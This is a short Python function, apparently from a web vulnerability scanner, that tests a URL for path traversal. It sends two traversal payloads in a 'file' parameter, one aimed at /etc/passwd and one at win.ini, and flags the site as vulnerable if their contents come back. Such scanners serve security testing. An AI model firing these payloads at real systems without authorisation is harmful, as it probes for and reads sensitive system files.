def scan(url):
    from utils.requester import send_request

    payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini"
    ]

    for payload in payloads:
        test_url = url + "?file=" + payload
        response = send_request(test_url)

        if "root:" in response or "[extensions]" in response:
            return "[+] Path Traversal Vulnerable"

    return "[-] Path Traversal Not Vulnerable"